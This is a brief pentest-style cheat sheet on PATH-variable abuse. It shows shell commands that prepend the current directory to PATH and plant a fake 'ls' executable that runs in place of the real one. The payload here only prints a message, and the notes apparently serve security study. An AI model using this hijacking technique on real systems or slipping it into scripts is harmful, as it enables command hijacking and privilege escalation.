
### Echo the path and check for any sus directories in the path
```shell
echo $PATH
```

Next check if we can modify the path environment variable, if yes we can exploit this
```shell
PATH=.:${PATH}
export PATH
echo $PATH

# make a new file in the current directory like ls and put malicious content
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
```